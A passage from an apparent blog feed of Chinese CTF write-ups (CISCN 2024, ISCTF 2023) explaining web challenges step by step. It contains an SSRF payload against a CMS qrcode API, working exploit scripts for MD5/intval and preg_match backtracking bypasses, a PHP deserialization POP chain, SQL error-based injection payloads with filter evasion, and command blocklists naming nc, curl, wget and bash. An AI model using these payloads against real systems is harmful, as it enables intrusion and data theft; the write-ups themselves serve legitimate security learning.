class="number">3</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&#x27;二维码生成失败&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$thumb</span>, <span class="string">&#x27;https://&#x27;</span>) !== <span class="literal">false</span></span><br><span class="line">                    &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$thumb</span>, <span class="string">&#x27;/&#x27;</span>) !== <span class="literal">false</span></span><br><span class="line">                    &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$thumb</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&#x27;图片地址不规范&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$img</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$thumb</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$img</span>) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&#x27;此图片不是一张可用的图片&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$code</span> = <span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$code</span>) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&#x27;图片参数不规范&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="variable">$code</span>);</span><br><span class="line">                <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片宽度</span></span><br><span class="line">                <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片宽度</span></span><br><span class="line">                <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片高度</span></span><br><span class="line">                <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">                <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">                <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">                <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">                <span class="comment">//重新组合图片并调整大小</span></span><br><span class="line">                <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, (<span class="keyword">int</span>)<span class="variable">$from_width</span>, (<span class="keyword">int</span>)<span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, (<span class="keyword">int</span>)<span class="variable">$logo_qr_width</span>, (<span class="keyword">int</span>)<span class="variable">$logo_qr_height</span>, (<span class="keyword">int</span>)<span class="variable">$logo_width</span>, (<span class="keyword">int</span>)<span class="variable">$logo_height</span>);</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>分析之后发现$thumb可控，因为这里的相关信息是填的图片地址</p><p>注意到<code>$code = dr_catcher_data($thumb);</code></p><p>定位到<code>/dayrui/Fcms/Control/Core/Helper.php</code></p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527120045229.png" class="" title="image-20240527120045229"><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527120018968.png" class="" title="image-20240527120018968"><p>根据api.php构造payload：</p><p><code>index.php?c=api&amp;s=api&amp;m=qrcode&amp;text=111&amp;size=1024&amp;level=1&amp;thumb=http://127.0.0.1/flag.php</code></p><p>（为什么会这样构造可以看看Fcms下的init.php,然后再结合Api.php看看）</p><img src="/2024/05/27/competition/202405/ciscn2024/image-20240527130138931.png" class="" title="image-20240527130138931"><p>但是没有输出，只有一个二维码，扫出来只有text的内容</p><p>尝试使用302跳转来反弹shell</p><p>（先放着，我弄了好久都没弄出来）</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;simple-php&quot;&gt;&lt;a href=&quot;#simple-php&quot; class=&quot;headerlink&quot; title=&quot;simple_php&quot;&gt;&lt;/a&gt;simple_php&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;ini_set&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;open_basedir&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;/var/www/html/&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;error_reporting&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable&quot;&gt;$cmd&lt;/span&gt; = &lt;span class=&quot;title function_ invoke__&quot;&gt;escapeshellcmd&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;title function_ invoke__&quot;&gt;preg_match&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|&#92;*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|&#92;.|&amp;#123;|&amp;#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|&#92;?|wget|&#92;&amp;#x27;|&#92;&amp;quot;|id|whoami/i&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$cmd&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;title function_ invoke__&quot;&gt;system&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$cmd&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;show_source&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ISCTF2023</title>
    <link href="http://luffys93.github.io/2024/05/16/competition/Others/ISCTF2023/"/>
    <id>http://luffys93.github.io/2024/05/16/competition/Others/ISCTF2023/</id>
    <published>2024-05-16T04:27:11.000Z</published>
    <updated>2024-07-31T08:37:44.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="绕进你心里"><a href="#绕进你心里" class="headerlink" title="绕进你心里"></a>绕进你心里</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;pan_gu&#x27;</span>];</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;zhurong&#x27;</span>];</span><br><span class="line"><span class="variable">$lida1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hongmeng&#x27;</span>];</span><br><span class="line"><span class="variable">$lida2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shennong&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$lida1</span> !== <span class="variable">$lida2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$lida1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$lida2</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5绕过了!&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;你干嘛?哎哟!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ISCTF/is&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再想想!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>, <span class="string">&#x27;2023ISCTF&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;就差一点点啦!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><span id="more"></span><p>md5的绕过不多说，数组直接奉上；<code>intval()</code>的绕过也可以用数组，它在处理数组时，若数组为空，则返回0，否则返回1</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240516123445917.png" class="" title="image-20240516123445917"><p>下一关就是利用<code>preg_match()</code>的特性绕过，<code>preg_match()</code>有一个回溯次数上限（可以类比于查询字符/字符串的次数上限）默认是1000000，超过这个数则返回false</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240516124059867.png" class="" title="image-20240516124059867"><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://gz.imxbt.cn:20308/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=3&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;pan_gu&quot;</span>: <span class="string">&#x27;ssss&#x27;</span>*<span class="number">250000</span> + <span class="string">&#x27;2023ISCTF&#x27;</span>&#125;</span><br><span class="line">req = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure><h2 id="圣杯战争"><a href="#圣杯战争" class="headerlink" title="圣杯战争"></a>圣杯战争</h2><p>简单的反序列化，pop：</p><p><code>summon::__wakeup()</code>-&gt;<code>artifact::__toString()</code>-&gt;<code>prepare::__get()</code>-&gt;<code>saber::__invoke()</code></p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">artifact</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$excalibuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arrow</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;excalibuer-&gt;arrow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prepare</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$release</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$functioin</span> = <span class="variable language_">$this</span>-&gt;release;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$functioin</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">saber</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;weapon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Saber</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Rider</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Saber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Summon</span> = <span class="keyword">new</span> <span class="title function_ invoke__">summon</span>();</span><br><span class="line"><span class="variable">$Artifact</span> = <span class="keyword">new</span> <span class="title function_ invoke__">artifact</span>();</span><br><span class="line"><span class="variable">$Prepare</span> = <span class="keyword">new</span> <span class="title function_ invoke__">prepare</span>();</span><br><span class="line"><span class="variable">$Saber</span> = <span class="keyword">new</span> <span class="title function_ invoke__">saber</span>();</span><br><span class="line"><span class="variable">$Summon</span>-&gt;Saber = <span class="variable">$Artifact</span>;</span><br><span class="line"><span class="variable">$Artifact</span>-&gt;excalibuer = <span class="variable">$Prepare</span>;</span><br><span class="line"><span class="variable">$Prepare</span>-&gt;release = <span class="variable">$Saber</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$Summon</span>)));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240516125030449.png" class="" title="image-20240516125030449"><h2 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">function</span> <span class="title function_">string_to_int_array</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> intArr = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">          <span class="keyword">const</span> charcode = str.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> partA = <span class="title class_">Math</span>.<span class="title function_">floor</span>(charcode / <span class="number">26</span>);</span><br><span class="line">          <span class="keyword">const</span> partB = charcode % <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line">          intArr.<span class="title function_">push</span>(partA);</span><br><span class="line">          intArr.<span class="title function_">push</span>(partB);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> intArr;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">int_array_to_text</span>(<span class="params">int_array</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> txt = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;int_array.<span class="property">length</span>;i++)&#123;</span><br><span class="line">          txt += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span> + int_array[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> txt;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hash = <span class="title function_">int_array_to_text</span>(<span class="title function_">string_to_int_array</span>(<span class="title function_">int_array_to_text</span>(<span class="title function_">string_to_int_array</span>(parameter))));</span><br><span class="line"><span class="keyword">if</span>(hash === <span class="string">&#x27;dxdydxdudxdtdxeadxekdxea&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;flag.html&#x27;</span>;</span><br><span class="line">          &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fail&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（这里扫出来一个index.bak文件，之前没扫出来是因为被校园网过滤掉了）</p><p>写一个逆向解密：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parameter2 =  <span class="string">&#x27;dxdydxdudxdtdxeadxekdxea&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">text_to_int_array</span>(<span class="params">text</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> int_array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;text.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> charcode = text.<span class="title function_">charCodeAt</span>(i) - <span class="number">97</span>;</span><br><span class="line">        int_array.<span class="title function_">push</span>(charcode)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> int_array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">int_array_to_string</span>(<span class="params">int_array2</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> text2 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;int_array2.<span class="property">length</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        parta = int_array2[i];</span><br><span class="line">        partb = int_array2[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">let</span> charcode2 = parta * <span class="number">26</span> + partb;</span><br><span class="line">        text2 += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(charcode2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> text2;</span><br><span class="line">&#125;</span><br><span class="line">answer = <span class="title function_">int_array_to_string</span>(<span class="title function_">text_to_int_array</span>(<span class="title function_">int_array_to_string</span>(<span class="title function_">text_to_int_array</span>(parameter2))));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(answer);</span><br></pre></td></tr></table></figure><p>得到mihoyo</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240516151235230.png" class="" title="image-20240516151235230"><p>然后就是普通的文件包含了（之前dirsearch扫出来还有个flag.php）</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240516151351862.png" class="" title="image-20240516151351862"><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240516151336677.png" class="" title="image-20240516151336677"><h2 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a>easy_website</h2><p>sql注入，简单地fuzz一下，发现过滤了or，and，select，空格等，对字符串的过滤可以用双写绕过，空格可以用/**/绕过。这题考虑报错注入而非盲注</p><p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e,database(),0x7e),1);#</code> -&gt; users</p><p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e，(selselectect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#39;users&#39;),0x7e),1);#</code> -&gt; users</p><p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#39;users&#39;/**/anandd/**/table_schema=&#39;users&#39;),0x7e),1);#</code> -&gt; user，password</p><p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e,(selselectect/**/passwoorrd/**/from/**/users/**/limit/**/2,1),0x7e),1);#</code> 这里因为输出限制导致flag没有输出完整，可以用substring或者mid之类的函数 flag{f5ea3f34-c0eb-45ac-b35d</p><p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e,substring((selselectect/**/passwoorrd/**/from/**/users/**/limit/**/2,1),19,30),0x7e),1);#</code> 45ac-b35d-623f62014c27}</p><h2 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a>wafr</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Read /flaggggggg.txt</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;<span class="comment">//strings</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;想读我文件？大胆。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\^|\||\~|\\$|\%|jay/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;无字母数字RCE？大胆！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span 